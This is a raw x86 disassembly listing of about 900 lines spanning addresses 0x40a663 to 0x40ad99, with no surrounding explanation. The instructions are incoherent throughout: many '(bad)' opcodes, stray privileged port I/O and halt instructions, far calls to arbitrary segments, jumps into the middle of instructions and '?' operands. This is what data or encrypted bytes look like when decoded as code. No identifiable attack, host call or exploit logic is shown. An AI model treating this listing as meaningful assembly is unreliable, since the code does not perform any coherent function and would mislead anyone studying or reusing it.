  40a663:	xchg   esi,eax
  40a664:	pop    esp
  40a665:	or     eax,0x232d1203
  40a66a:	jno    0x40a61b
  40a66c:	stos   BYTE PTR es:[edi],al
  40a66d:	cmp    al,0x79
  40a66f:	pop    ss
  40a670:	fstp   DWORD PTR [edi]
  40a672:	pop    eax
  40a673:	and    esp,DWORD PTR [esi-0x460a67]
  40a679:	dec    ebp
  40a67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a67b:	or     al,0x4
  40a67d:	jp     0x40a605
  40a67f:	pop    eax
  40a680:	sbb    BYTE PTR [edi-0x56e4e7c9],bl
  40a686:	loopne 0x40a6cd
  40a688:	or     al,0x13
  40a68a:	mov    eax,ds:0x51746de9
  40a68f:	cmp    al,0x9e
  40a691:	out    0xbd,al
  40a693:	rcl    edx,1
  40a695:	xchg   esp,eax
  40a696:	mov    edx,DWORD PTR [ebp+0x14]
  40a699:	mov    cs,WORD PTR [si]
  40a69c:	mov    ch,0x2c
  40a69e:	mov    cl,dh
  40a6a0:	aam    0x90
  40a6a2:	adc    cl,BYTE PTR [esi+0x1a8b9b3e]
  40a6a8:	retf   0x8952
  40a6ab:	stc    
  40a6ac:	dec    esi
  40a6ad:	or     al,0x73
  40a6af:	call   0xe06:0x357c2725
  40a6b6:	cmp    BYTE PTR [ebp-0x6c248e2a],ah
  40a6bc:	in     eax,dx
  40a6bd:	in     al,0x16
  40a6bf:	lods   al,BYTE PTR ds:[esi]
  40a6c0:	adc    al,0x7b
  40a6c2:	add    BYTE PTR [ebx],ch
  40a6c4:	lahf   
  40a6c5:	xchg   ecx,eax
  40a6c6:	pop    ss
  40a6c7:	sub    eax,0xf5fec06e
  40a6cc:	cs cdq 
  40a6ce:	or     DWORD PTR [ecx-0x24],esp
  40a6d1:	fnstcw WORD PTR [edx+esi*8+0xb]
  40a6d5:	loop   0x40a6eb
  40a6d7:	or     eax,0xf637983f
  40a6dc:	inc    ecx
  40a6dd:	mov    ebp,0xb81c18e9
  40a6e2:	int3   
  40a6e3:	dec    edx
  40a6e4:	sub    esp,DWORD PTR [eax+0x37b736e1]
  40a6ea:	lahf   
  40a6eb:	sub    eax,0x6061323c
  40a6f0:	pop    edx
  40a6f1:	pusha  
  40a6f2:	or     ecx,DWORD PTR [ebp+ebx*1-0x4a067ae0]
  40a6f9:	jmp    DWORD PTR [ebx-0x1341f156]
  40a6ff:	mov    ch,0x3a
  40a701:	repz aaa 
  40a703:	xchg   esi,eax
  40a704:	adc    eax,DWORD PTR [esi+0x66d4a58f]
  40a70a:	cmp    cl,BYTE PTR [ebx+0x1c]
  40a70d:	jne    0x40a6fe
  40a70f:	into   
  40a710:	mov    eax,DWORD PTR [eax+0xe]
  40a713:	jp     0x40a74d
  40a715:	push   0x59df67e1
  40a71a:	push   eax
  40a71b:	jno    0x40a75c
  40a71d:	rcr    edi,1
  40a71f:	mov    esi,ebx
  40a721:	inc    eax
  40a722:	push   ss
  40a723:	fsub   QWORD PTR [edi+esi*2-0x1bc6c0e5]
  40a72a:	pop    edx
  40a72b:	xchg   esp,eax
  40a72c:	push   0xffffffed
  40a72e:	rcl    dh,cl
  40a730:	popf   
  40a731:	cmc    
  40a732:	je     0x40a6cc
  40a734:	in     al,0xb0
  40a736:	hlt    
  40a737:	cmp    al,0xbd
  40a739:	imul   ecx,DWORD PTR [edx+0x63],0xaf609fb6
  40a740:	pop    ebx
  40a741:	hlt    
  40a742:	jmp    0x40a6e6
  40a744:	sub    cl,al
  40a746:	(bad)  
  40a748:	ss or  ch,bl
  40a74b:	push   edx
  40a74c:	bound  eax,QWORD PTR [edx+0x434f076e]
  40a752:	sbb    eax,0xd631c936
  40a757:	into   
  40a758:	test   BYTE PTR [edi-0x3a241a5f],bl
  40a75e:	mov    bh,0x8
  40a760:	call   0x5031:0x456779a2
  40a767:	push   ss
  40a768:	pop    ebp
  40a769:	cmp    eax,0x3d194ae3
  40a76e:	push   ecx
  40a76f:	mov    ah,0xb3
  40a771:	nop
  40a772:	xchg   ebp,eax
  40a773:	rcl    DWORD PTR [edi+0x32],cl
  40a776:	jp     0x40a7f3
  40a778:	mov    BYTE PTR [esi-0x3],ah
  40a77b:	dec    esi
  40a77c:	adc    al,0x4c
  40a77e:	inc    ebp
  40a77f:	xor    ah,dh
  40a781:	pop    edi
  40a782:	inc    esp
  40a783:	add    al,BYTE PTR [ebx+0x9]
  40a786:	xor    ecx,DWORD PTR ds:0x3ff50ce5
  40a78c:	add    al,0x32
  40a78e:	retf   
  40a78f:	push   esi
  40a790:	ds xor eax,0x308d496f
  40a796:	cld    
  40a797:	repnz out 0x85,al
  40a79a:	sbb    al,0x84
  40a79c:	(bad)  
  40a79d:	test   BYTE PTR [esi+ebp*2-0x34],0xb6
  40a7a2:	mov    dh,0x9f
  40a7a4:	out    dx,al
  40a7a5:	icebp  
  40a7a6:	test   al,dh
  40a7a8:	div    BYTE PTR [ebx+eiz*4+0x58]
  40a7ac:	cli    
  40a7ad:	mov    dl,0xb0
  40a7af:	int3   
  40a7b0:	and    BYTE PTR [edi],dl
  40a7b2:	sbb    eax,0x4f5d43f5
  40a7b7:	dec    edx
  40a7b8:	push   esp
  40a7b9:	push   ds
  40a7ba:	mov    ebp,fs
  40a7bc:	pop    edi
  40a7bd:	imul   eax,DWORD PTR [edi],0x53
  40a7c0:	ins    DWORD PTR es:[edi],dx
  40a7c1:	mov    edi,0x6b9c0ad8
  40a7c6:	pop    ebp
  40a7c7:	out    0xd6,eax
  40a7c9:	xchg   ebp,eax
  40a7ca:	inc    edi
  40a7cb:	les    esi,FWORD PTR [eax-0xd]
  40a7ce:	sbb    al,0x7e
  40a7d0:	mov    cl,0x94
  40a7d2:	(bad)  
  40a7d4:	sub    ebx,DWORD PTR [ebx+0x516bd06]
  40a7da:	lods   al,BYTE PTR ds:[esi]
  40a7db:	pop    eax
  40a7dc:	and    eax,DWORD PTR [ecx]
  40a7de:	sbb    BYTE PTR fs:[eax+0x4aa0c4c1],al
  40a7e5:	mov    WORD PTR [eax],ss
  40a7e7:	mov    ah,0x1d
  40a7e9:	loope  0x40a85a
  40a7eb:	xchg   ebx,eax
  40a7ec:	outs   dx,DWORD PTR ds:[esi]
  40a7ed:	sbb    DWORD PTR [ebp+ebp*4-0xb],0x28
  40a7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7f3:	mov    edx,0x7639cfe1
  40a7f8:	or     bl,ah
  40a7fa:	add    BYTE PTR [edx-0x74],0x31
  40a7fe:	and    ah,BYTE PTR [esi+0xc13623f]
  40a804:	call   0x596ad810
  40a809:	cmp    ebx,DWORD PTR fs:[esp+edx*1-0x6d83dabe]
  40a811:	push   edx
  40a812:	mov    ebp,0x145e21b5
  40a817:	sub    DWORD PTR [edx+0x51],eax
  40a81a:	ficomp WORD PTR [edx+0x292e6638]
  40a820:	aam    0x43
  40a822:	loope  0x40a86b
  40a824:	jmp    eax
  40a826:	cmp    DWORD PTR [ebp-0x13726b1b],edx
  40a82c:	mov    WORD PTR [ebx],?
  40a82e:	out    0xc7,eax
  40a830:	and    al,0x3c
  40a832:	xchg   DWORD PTR [edx],edi
  40a834:	das    
  40a835:	int    0xdc
  40a837:	test   al,0xd3
  40a839:	fwait
  40a83a:	dec    ebp
  40a83b:	in     eax,dx
  40a83c:	inc    edx
  40a83d:	imul   esp,DWORD PTR [ebx+0x47],0x53
  40a841:	sar    DWORD PTR [ebx+0x54],1
  40a844:	sub    DWORD PTR [edx],esi
  40a846:	mov    ecx,esi
  40a848:	xor    al,0x39
  40a84a:	jmp    0x40a86f
  40a84c:	adc    eax,0xa76575f5
  40a851:	enter  0x2b76,0x13
  40a855:	add    al,0x25
  40a857:	cdq    
  40a858:	unpckhps xmm6,XMMWORD PTR [ebx]
  40a85b:	cs (bad) ss:[eax-0x2707d17f]
  40a863:	push   ecx
  40a864:	in     al,dx
  40a865:	add    edx,DWORD PTR [ebx+0x55]
  40a868:	cmp    al,0xec
  40a86a:	xchg   BYTE PTR [edi-0xc],bl
  40a86d:	cmp    DWORD PTR [ecx-0xd2a3d37],ebp
  40a873:	(bad)  
  40a874:	jg     0x40a8e6
  40a876:	xor    ebp,ecx
  40a878:	jne    0x40a8ac
  40a87a:	and    ebx,DWORD PTR [ebx]
  40a87c:	das    
  40a87d:	xchg   ebp,eax
  40a87e:	out    dx,eax
  40a87f:	test   BYTE PTR [ebx],dh
  40a881:	enter  0x8516,0x43
  40a885:	(bad)  
  40a886:	xchg   esi,eax
  40a887:	out    0x21,al
  40a889:	xor    DWORD PTR [esi],0xffffffe4
  40a88c:	(bad)  
  40a88d:	aad    0xc8
  40a88f:	test   DWORD PTR [edx+ebp*2+0x55feff31],edx
  40a896:	push   esi
  40a897:	cld    
  40a898:	xor    DWORD PTR [ebx-0x12],ebp
  40a89b:	sahf   
  40a89c:	mov    dh,0x2c
  40a89e:	jmp    0x40a841
  40a8a0:	idiv   BYTE PTR [ebx]
  40a8a2:	pop    ds
  40a8a3:	stos   DWORD PTR es:[edi],eax
  40a8a4:	xor    BYTE PTR [esi-0x38],ah
  40a8a7:	pop    esp
  40a8a8:	stc    
  40a8a9:	(bad)  [edi+0x655fa08]
  40a8af:	mov    BYTE PTR [ebx+0x5cc7282d],ch
  40a8b5:	pop    ebx
  40a8b6:	mov    al,0x73
  40a8b8:	inc    ecx
  40a8b9:	fs mov ebp,0x465e2af6
  40a8bf:	pop    ebx
  40a8c0:	retf   0x8295
  40a8c3:	imul   ebp,DWORD PTR [esi],0xac2fe3d4
  40a8c9:	dec    ebx
  40a8ca:	bound  ebp,QWORD PTR [ecx+0x27bdc37f]
  40a8d0:	stos   BYTE PTR es:[edi],al
  40a8d1:	lods   eax,DWORD PTR ds:[esi]
  40a8d2:	cmp    BYTE PTR [edi+0xbaafc52],dh
  40a8d8:	cwde   
  40a8d9:	push   0x8ba96f5c
  40a8de:	xchg   ebx,eax
  40a8df:	inc    edx
  40a8e0:	pop    edi
  40a8e1:	cdq    
  40a8e2:	(bad)  
  40a8e3:	int3   
  40a8e4:	push   0x16
  40a8e6:	es out 0xb,eax
  40a8e9:	pop    eax
  40a8ea:	dec    edi
  40a8eb:	out    dx,eax
  40a8ec:	push   0xffffff99
  40a8ee:	or     bl,BYTE PTR [ebp+0x1a]
  40a8f1:	jbe    0x40a8c4
  40a8f3:	in     al,dx
  40a8f4:	ror    ebx,cl
  40a8f6:	and    dh,0xea
  40a8f9:	xchg   edi,eax
  40a8fa:	add    bl,BYTE PTR ds:0x3976ba6c
  40a900:	jo     0x40a951
  40a902:	ds push ebx
  40a904:	mov    dh,0x5a
  40a906:	sti    
  40a907:	pop    ebx
  40a908:	xchg   esp,eax
  40a909:	inc    eax
  40a90a:	nop
  40a90b:	xor    BYTE PTR [edi+0x30],ch
  40a90e:	adc    al,0x6f
  40a910:	daa    
  40a911:	pop    es
  40a912:	ins    DWORD PTR es:[edi],dx
  40a913:	sbb    cl,BYTE PTR [ecx+eax*1-0x17]
  40a917:	lods   al,BYTE PTR ds:[esi]
  40a918:	pop    edi
  40a919:	es mov dh,ch
  40a91c:	xor    DWORD PTR [edi],eax
  40a91e:	push   es
  40a91f:	js     0x40a97c
  40a921:	add    DWORD PTR [esi+0x1d],ebx
  40a924:	add    eax,0xcdf977bd
  40a929:	jns    0x40a8c1
  40a92b:	bound  ebx,QWORD PTR [ecx-0x39]
  40a92e:	sbb    al,0x65
  40a930:	in     eax,dx
  40a931:	push   eax
  40a932:	outs   dx,DWORD PTR ds:[esi]
  40a933:	dec    eax
  40a934:	inc    esi
  40a935:	test   eax,0xf20cf642
  40a93a:	dec    ebp
  40a93b:	nop
  40a93c:	inc    esp
  40a93d:	pop    eax
  40a93e:	out    dx,al
  40a93f:	sbb    eax,0xd1fe06ca
  40a944:	cmp    DWORD PTR ss:[ecx],eax
  40a947:	sub    DWORD PTR [ebp+0x36],ebp
  40a94a:	xchg   esp,eax
  40a94b:	add    bl,BYTE PTR [eax]
  40a94d:	xchg   ebx,eax
  40a94e:	call   FWORD PTR [ebx]
  40a950:	or     eax,0xb857b541
  40a955:	dec    esp
  40a956:	inc    esi
  40a957:	jle    0x40a9cd
  40a959:	dec    edx
  40a95a:	les    edx,FWORD PTR [ecx+0x30a7dfd8]
  40a960:	inc    eax
  40a961:	scas   eax,DWORD PTR es:[edi]
  40a962:	nop
  40a963:	and    BYTE PTR [esi],ch
  40a965:	adc    BYTE PTR [esi-0x12],cl
  40a968:	jmp    0x40a9d4
  40a96a:	cli    
  40a96b:	sbb    al,0xa6
  40a96d:	lods   al,BYTE PTR ds:[esi]
  40a96e:	je     0x40a967
  40a970:	(bad)  
  40a971:	mov    fs,WORD PTR [ebx-0x22]
  40a974:	aam    0xd7
  40a976:	cli    
  40a977:	test   esp,0x9b2fa965
  40a97d:	mov    bl,0xb0
  40a97f:	add    BYTE PTR ds:0x8c57438d,0x8d
  40a986:	push   eax
  40a987:	jl     0x40a95d
  40a989:	inc    edx
  40a98a:	jno    0x40a959
  40a98c:	cmp    al,0x48
  40a98e:	xchg   esi,eax
  40a98f:	pop    esp
  40a990:	pop    es
  40a991:	push   0xffffffac
  40a993:	sub    BYTE PTR [ebx-0x54],0x27
  40a997:	pop    esp
  40a998:	jae    0x40a949
  40a99a:	cmp    DWORD PTR [edx+0x347cb382],ebp
  40a9a0:	scas   eax,DWORD PTR es:[edi]
  40a9a1:	inc    edx
  40a9a2:	jmp    DWORD PTR [edi-0x5769ec10]
  40a9a8:	in     al,dx
  40a9a9:	das    
  40a9aa:	push   cs
  40a9ab:	bound  eax,QWORD PTR [edx-0x716af9a2]
  40a9b1:	cs push cs
  40a9b3:	push   eax
  40a9b4:	rol    DWORD PTR [ecx-0x6b],1
  40a9b7:	add    DWORD PTR ds:0x70169287,esp
  40a9bd:	sbb    edi,DWORD PTR [ebx+0x13335e18]
  40a9c3:	jns    0x40a97f
  40a9c5:	pop    es
  40a9c6:	fmul   QWORD PTR [edx]
  40a9c8:	mov    al,0x10
  40a9ca:	pop    ecx
  40a9cb:	fdiv   st,st(0)
  40a9cd:	push   0x98a188c3
  40a9d2:	aad    0x4d
  40a9d4:	cld    
  40a9d5:	outs   dx,DWORD PTR ds:[esi]
  40a9d6:	and    al,0xf7
  40a9d8:	lea    edi,[ebp+ecx*4+0x36]
  40a9dc:	xor    ecx,esp
  40a9de:	cmc    
  40a9df:	xchg   ebp,eax
  40a9e0:	cmp    eax,0x36dadb48
  40a9e5:	lahf   
  40a9e6:	ins    BYTE PTR es:[edi],dx
  40a9e7:	out    dx,al
  40a9e8:	inc    eax
  40a9e9:	jae    0x40a98b
  40a9eb:	push   ebx
  40a9ec:	inc    edx
  40a9ed:	xlat   BYTE PTR ds:[ebx]
  40a9ee:	add    BYTE PTR [ecx-0x147f2958],cl
  40a9f4:	pop    esi
  40a9f5:	pop    es
  40a9f6:	inc    esi
  40a9f7:	std    
  40a9f8:	mov    cl,0xe3
  40a9fa:	clc    
  40a9fb:	adc    al,0x45
  40a9fd:	cmc    
  40a9fe:	jo     0x40a9a6
  40aa00:	test   al,0xec
  40aa02:	cmp    al,0xa0
  40aa04:	inc    ebp
  40aa05:	icebp  
  40aa06:	je     0x40a9a9
  40aa08:	jb     0x40aa6e
  40aa0a:	aam    0xe2
  40aa0c:	push   es
  40aa0d:	aas    
  40aa0e:	mov    ds,WORD PTR [esi]
  40aa10:	stos   BYTE PTR es:[edi],al
  40aa11:	xchg   ebp,eax
  40aa12:	mov    eax,ds:0x1d42b769
  40aa17:	add    eax,0x691c88ab
  40aa1c:	ficomp WORD PTR [edi]
  40aa1e:	sbb    ebp,esp
  40aa20:	jmp    0x40aa65
  40aa22:	xchg   ecx,eax
  40aa23:	in     al,0x8e
  40aa25:	cmp    ebp,edx
  40aa27:	xchg   BYTE PTR [eax+0x570f8a24],ah
  40aa2d:	cli    
  40aa2e:	push   eax
  40aa2f:	ret    0xb24a
  40aa32:	mov    eax,ds:0x250da171
  40aa37:	cmp    DWORD PTR [esi-0x6ae765ed],esp
  40aa3d:	clc    
  40aa3e:	xor    al,0x36
  40aa40:	dec    eax
  40aa41:	inc    eax
  40aa42:	or     BYTE PTR [eax+eax*2+0xf2ea279],0x9f
  40aa4a:	out    0xbe,eax
  40aa4c:	xchg   DWORD PTR [eax+0x7dd803de],ebx
  40aa52:	daa    
  40aa53:	xor    esp,eax
  40aa55:	sar    DWORD PTR [edi+0x20b178ce],cl
  40aa5b:	mov    DWORD PTR [ebx+0x61001068],edx
  40aa61:	cli    
  40aa62:	push   esi
  40aa63:	aam    0xe4
  40aa65:	in     al,0x8e
  40aa67:	out    0xaa,al
  40aa69:	xor    ch,BYTE PTR [edx+0x28a42d9e]
  40aa6f:	repnz xchg ebp,eax
  40aa71:	xchg   DWORD PTR ds:0xc3ab610d,ebp
  40aa77:	imul   esp,DWORD PTR ds:0x11b575d3,0x7
  40aa7e:	neg    bl
  40aa80:	mov    edi,0xaaa5b0c5
  40aa85:	popf   
  40aa86:	adc    edi,esp
  40aa88:	push   cs
  40aa89:	jg     0x40aaa2
  40aa8b:	retf   0x6055
  40aa8e:	cld    
  40aa8f:	or     al,0x85
  40aa91:	(bad)  
  40aa92:	mov    ebp,0xfd428e4f
  40aa97:	lock mov eax,0xa0c729ad
  40aa9d:	mov    al,ds:0x7aed29f6
  40aaa2:	jle    0x40aaf3
  40aaa4:	dec    esi
  40aaa5:	mov    eax,ds:0x7aa29906
  40aaaa:	push   eax
  40aaab:	sbb    al,0x93
  40aaad:	mov    edi,0xea8ad4d5
  40aab2:	(bad)  
  40aab3:	clc    
  40aab4:	rcr    BYTE PTR [ecx],0x41
  40aab7:	cmp    al,0xbc
  40aaba:	mov    eax,ds:0xe687de1b
  40aabf:	jns    0x40aa43
  40aac1:	or     al,0x67
  40aac3:	add    ebx,0x1f
  40aac6:	and    al,0xb0
  40aac8:	sub    BYTE PTR [esi+edi*1-0x62],ch
  40aacc:	adc    cl,BYTE PTR [eax-0x64]
  40aacf:	jmp    0xfb74dd0b
  40aad4:	cmp    edx,DWORD PTR [edx]
  40aad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aad7:	jne    0x40aaf8
  40aad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aada:	and    BYTE PTR [edi],cl
  40aadc:	pusha  
  40aadd:	enter  0xf04,0x20
  40aae1:	dec    ecx
  40aae2:	jg     0x40ab28
  40aae4:	(bad)  
  40aae5:	xor    ebx,DWORD PTR [esi+0x72]
  40aae8:	push   ebx
  40aae9:	pop    ds
  40aaea:	popa   
  40aaeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaec:	loop   0x40ab14
  40aaee:	in     al,dx
  40aaef:	xchg   ecx,eax
  40aaf0:	cmp    DWORD PTR [edi],edx
  40aaf2:	and    eax,0xa8c5d3f1
  40aaf7:	mov    bh,0xb7
  40aaf9:	aad    0xb7
  40aafb:	rol    DWORD PTR [edi+0x25],1
  40aafe:	sub    eax,eax
  40ab00:	jmp    FWORD PTR [esi]
  40ab02:	lods   eax,DWORD PTR ds:[esi]
  40ab03:	sahf   
  40ab04:	pop    DWORD PTR [eax]
  40ab06:	aas    
  40ab07:	ins    BYTE PTR es:[edi],dx
  40ab08:	in     eax,dx
  40ab09:	test   eax,0x1cc308a7
  40ab0e:	in     eax,0x34
  40ab10:	inc    esi
  40ab11:	jo     0x40ab2d
  40ab13:	and    DWORD PTR [edx+ecx*8+0x71b1cb02],ecx
  40ab1a:	das    
  40ab1b:	popa   
  40ab1c:	xor    DWORD PTR ds:0xd7b7602a,edi
  40ab22:	loope  0x40aadd
  40ab24:	pop    eax
  40ab25:	push   0x7c9377d4
  40ab2a:	(bad)  
  40ab2b:	jp     0x40ab76
  40ab2d:	add    BYTE PTR [edi+0x2d],al
  40ab30:	xor    al,0xc0
  40ab32:	pop    eax
  40ab33:	pop    eax
  40ab34:	out    0x9c,eax
  40ab36:	dec    edx
  40ab37:	into   
  40ab38:	fwait
  40ab39:	mov    ch,dh
  40ab3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab3c:	mov    ecx,0x599cb9dc
  40ab41:	cmp    al,0xa1
  40ab43:	cmp    bl,ch
  40ab45:	lahf   
  40ab46:	push   eax
  40ab47:	ds mov bl,0x8
  40ab4a:	pop    edi
  40ab4b:	repz or ch,BYTE PTR [edx+eiz*2-0x32dd328d]
  40ab53:	and    DWORD PTR [eax],edi
  40ab55:	fdiv   st,st(5)
  40ab57:	(bad)  
  40ab58:	sbb    al,0xb
  40ab5a:	out    dx,al
  40ab5b:	dec    esp
  40ab5c:	stc    
  40ab5d:	or     dh,BYTE PTR [esi+0x37daa46f]
  40ab63:	enter  0x65a7,0x8d
  40ab67:	push   ecx
  40ab68:	jp     0x40aaf7
  40ab6a:	stc    
  40ab6b:	sbb    dl,BYTE PTR [ebx+0x17]
  40ab6e:	push   ebp
  40ab6f:	lods   eax,DWORD PTR ds:[esi]
  40ab70:	sbb    dh,BYTE PTR [ebx-0x5]
  40ab73:	sub    cl,BYTE PTR [eax+0x2e]
  40ab76:	push   esi
  40ab77:	cdq    
  40ab78:	aad    0x75
  40ab7a:	mov    dh,0x7c
  40ab7c:	enter  0x8c4c,0xf4
  40ab80:	mov    bl,0x15
  40ab82:	pushf  
  40ab83:	cmp    ebx,ebx
  40ab85:	dec    esi
  40ab86:	nop
  40ab87:	or     ecx,DWORD PTR [esi]
  40ab89:	(bad)  
  40ab8a:	ss push ebp
  40ab8c:	push   esp
  40ab8d:	push   ss
  40ab8e:	and    esi,DWORD PTR [ecx-0x1f67f2f4]
  40ab94:	dec    esp
  40ab95:	pmaxsw mm1,mm4
  40ab98:	out    dx,al
  40ab99:	mov    ah,0xfd
  40ab9b:	jne    0x40ab26
  40ab9d:	out    0x9d,eax
  40ab9f:	push   esi
  40aba0:	cmp    edi,DWORD PTR [edi]
  40aba2:	jg     0x40ab69
  40aba4:	add    al,0x2b
  40aba6:	xchg   edx,eax
  40aba7:	out    0xdb,al
  40aba9:	stc    
  40abaa:	cli    
  40abab:	inc    ebp
  40abac:	pop    edx
  40abad:	push   edx
  40abae:	sbb    eax,0x992c341d
  40abb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abb4:	dec    edi
  40abb5:	mov    ecx,DWORD PTR [ebp+0x1ab0289a]
  40abbb:	pop    DWORD PTR [eax]
  40abbd:	leave  
  40abbe:	xchg   edx,eax
  40abbf:	std    
  40abc0:	and    eax,0xf19885d6
  40abc5:	mov    ecx,0xdeccc92e
  40abca:	jmp    0xf51f:0x6ffb4e45
  40abd1:	mov    eax,ds:0x355f619f
  40abd6:	and    al,0x21
  40abd8:	xor    eax,0xd0928d97
  40abdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abde:	imul   edx,DWORD PTR [ebx+ecx*8],0xa2a8a68
  40abe5:	lds    ecx,FWORD PTR [esi]
  40abe7:	in     eax,0x1b
  40abe9:	jns    0x40aba8
  40abeb:	sbb    esi,DWORD PTR [edx-0xcaebb70]
  40abf1:	mov    ch,0x4a
  40abf3:	mov    BYTE PTR [edx-0x2a908a24],0xae
  40abfa:	loop   0x40ac53
  40abfc:	lds    ebp,FWORD PTR [eax-0x39eea8e5]
  40ac02:	jb     0x40ac41
  40ac04:	bound  edx,QWORD PTR [esi-0x6b]
  40ac07:	mov    cl,0xe8
  40ac09:	dec    ebp
  40ac0a:	mov    edi,0x8284e9ce
  40ac0f:	mov    edi,0xa3e96adb
  40ac14:	sub    al,0xcf
  40ac16:	lahf   
  40ac17:	mov    al,ds:0xab24240b
  40ac1c:	ins    DWORD PTR es:[edi],dx
  40ac1d:	jle    0x40ac4e
  40ac1f:	and    eax,DWORD PTR [edi]
  40ac21:	into   
  40ac22:	into   
  40ac23:	push   0x5f
  40ac25:	cs adc al,ah
  40ac28:	rcr    BYTE PTR [edx-0x41ccc488],cl
  40ac2e:	ror    BYTE PTR [ebx+edx*4-0x6f],0xdc
  40ac33:	xor    ch,BYTE PTR [edi+0x348ab918]
  40ac39:	clc    
  40ac3a:	xor    dl,BYTE PTR [ebx-0x4e]
  40ac3d:	imul   ebx,DWORD PTR [ecx-0x2edcd95f],0x6e6ee4ee
  40ac47:	mov    ebx,0xa7073113
  40ac4c:	pop    es
  40ac4d:	outs   dx,DWORD PTR ds:[esi]
  40ac4e:	inc    esp
  40ac4f:	retf   
  40ac50:	rcr    BYTE PTR [edx+0x63],1
  40ac53:	jno    0x40aca0
  40ac55:	inc    esi
  40ac56:	bound  esp,QWORD PTR [eax]
  40ac58:	sub    BYTE PTR [ecx+0x70],cl
  40ac5b:	dec    edx
  40ac5c:	pop    ebp
  40ac5d:	adc    cl,BYTE PTR [eax+0x4de3f24a]
  40ac63:	stc    
  40ac64:	cmove  edx,DWORD PTR [edi-0x1f]
  40ac68:	in     al,dx
  40ac69:	or     dh,cl
  40ac6b:	es js  0x40ac1d
  40ac6e:	mov    esi,0xba25676c
  40ac73:	outs   dx,BYTE PTR ds:[esi]
  40ac74:	cli    
  40ac75:	fwait
  40ac76:	nop
  40ac77:	pop    ss
  40ac78:	in     eax,dx
  40ac79:	sub    bl,BYTE PTR [edx-0x2d]
  40ac7c:	mov    BYTE PTR [ebx-0x19474536],0x8
  40ac83:	mov    edi,fs
  40ac85:	loope  0x40aced
  40ac87:	std    
  40ac88:	jo     0x40acb4
  40ac8a:	jge    0x40acb9
  40ac8c:	mov    eax,0xcebc211b
  40ac91:	idiv   DWORD PTR [ebx-0xa92f64]
  40ac97:	stos   DWORD PTR es:[edi],eax
  40ac98:	cmp    BYTE PTR [eax-0x7c4ca3ca],al
  40ac9e:	pusha  
  40ac9f:	or     dh,BYTE PTR [esi+0x52383aca]
  40aca5:	mov    dh,0x4f
  40aca7:	in     al,0x29
  40aca9:	push   eax
  40acaa:	xchg   ebx,eax
  40acab:	(bad)  
  40acac:	sahf   
  40acad:	popf   
  40acae:	add    BYTE PTR [eax-0x640d98ac],0x9b
  40acb5:	es and al,0x94
  40acb8:	std    
  40acb9:	dec    ecx
  40acba:	push   0x55
  40acbc:	push   esi
  40acbd:	push   0xeb96cbc1
  40acc2:	adc    al,0xd0
  40acc4:	adc    al,0x95
  40acc6:	fdivr  QWORD PTR [edi+0x64]
  40acc9:	adc    al,0x7e
  40accb:	es or  eax,edi
  40acce:	push   es
  40accf:	push   0xa096def
  40acd4:	xchg   ecx,eax
  40acd5:	jl     0x40ad10
  40acd7:	(bad)  
  40acd8:	xlat   BYTE PTR ds:[ebx]
  40acd9:	lds    esp,FWORD PTR [ebp+0x53]
  40acdc:	fcomi  st,st(2)
  40acde:	push   ss
  40acdf:	xchg   ebx,eax
  40ace0:	jecxz  0x40ad5f
  40ace2:	jno    0x40ac9f
  40ace4:	pop    ebx
  40ace5:	fild   DWORD PTR [ecx-0x76]
  40ace8:	mov    esi,0x13849d87
  40aced:	jbe    0x40ad29
  40acef:	test   BYTE PTR [ebp+0x6e],ah
  40acf2:	es or  eax,0x2007a24
  40acf8:	push   cs
  40acf9:	mov    esp,0x773a06e0
  40acfe:	rcr    DWORD PTR [edi-0x44],0xd4
  40ad02:	loopne 0x40acb0
  40ad04:	or     al,0x5b
  40ad06:	cmp    eax,0xf30e94d1
  40ad0b:	or     BYTE PTR [ebx-0x30],0x9d
  40ad0f:	mov    esi,0x65145671
  40ad14:	mov    dl,0xe1
  40ad16:	stc    
  40ad17:	cmp    BYTE PTR [ecx+0x34dde649],cl
  40ad1d:	call   0x9951c394
  40ad22:	aaa    
  40ad23:	and    BYTE PTR [edx],ah
  40ad25:	fst    QWORD PTR ss:[ebx]
  40ad28:	call   0x1a639185
  40ad2d:	(bad)  
  40ad2e:	fdivr  DWORD PTR [ebp+0x28]
  40ad31:	stos   DWORD PTR es:[edi],eax
  40ad32:	into   
  40ad33:	lods   eax,DWORD PTR ds:[esi]
  40ad34:	(bad)  
  40ad35:	push   edx
  40ad36:	std    
  40ad37:	inc    edx
  40ad38:	jg     0x40adb9
  40ad3a:	retf   
  40ad3b:	sbb    al,0x97
  40ad3d:	outs   dx,BYTE PTR ds:[esi]
  40ad3e:	cmp    ebp,DWORD PTR [eax-0x44ae8a76]
  40ad44:	mul    DWORD PTR [edx+0x4e98b90e]
  40ad4a:	cdq    
  40ad4b:	xchg   esp,eax
  40ad4c:	(bad)  
  40ad4d:	jmp    0x40ad1c
  40ad4f:	scas   al,BYTE PTR es:[edi]
  40ad50:	lea    edx,[edi]
  40ad52:	mov    al,BYTE PTR [edx]
  40ad54:	shr    BYTE PTR [edx+0x6082571c],cl
  40ad5a:	mov    BYTE PTR [ebx+0x1a],dl
  40ad5d:	repz in al,0x6c
  40ad60:	scas   al,BYTE PTR es:[edi]
  40ad61:	add    eax,0x9d5988ce
  40ad66:	aam    0xec
  40ad68:	jne    0x40ad03
  40ad6a:	jl     0x40adb9
  40ad6c:	addr16 ret 0x250c
  40ad70:	xor    esi,DWORD PTR [ecx+0x4b]
  40ad73:	in     al,dx
  40ad74:	shr    BYTE PTR [ecx+0x36d5dc41],1
  40ad7a:	popa   
  40ad7b:	sub    eax,ebx
  40ad7d:	fdiv   QWORD PTR [edi+edi*1]
  40ad80:	int3   
  40ad81:	xor    BYTE PTR [ebx-0x12200432],cl
  40ad87:	pop    ecx
  40ad88:	out    dx,al
  40ad89:	cwde   
  40ad8a:	das    
  40ad8b:	push   ss
  40ad8c:	push   ebp
  40ad8d:	adc    ecx,DWORD PTR [eax+ecx*4-0x4f]
  40ad91:	mov    ?,WORD PTR [edx-0x294ee309]
  40ad97:	stc    
  40ad98:	dec    ebp
  40ad99:	pop    esi
